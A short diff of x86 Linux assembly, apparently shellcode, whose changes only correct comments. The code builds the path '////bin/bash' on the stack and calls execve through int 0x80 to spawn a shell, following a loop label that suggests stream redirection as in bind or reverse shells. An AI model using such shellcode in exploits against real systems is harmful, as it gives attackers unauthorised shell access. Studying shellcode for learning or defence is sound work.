@@ -149,7 +149,7 @@ stdloop:
   push  0x2f6e6962        ; /nib
   push  0x2f2f2f2f        ; ////
   mov   ebx,esp           ; Store pointer to executable's name in registry
-  push  edx               ; push null - the argument must be null terminated
+  push  edx               ; push null - the envp argument must be null
   push  ebx               ; push pointer to the executable path - the first argument of execve
   mov   ecx,esp           ; save pointer to the argv (pointer to string with executable + null)
-  int   0x80              ; run execve("////bin/bash", NULL, NULL) => the last NULL is in edx
+  int   0x80              ; run execve("////bin/bash", argv, NULL) => the last NULL is in edx
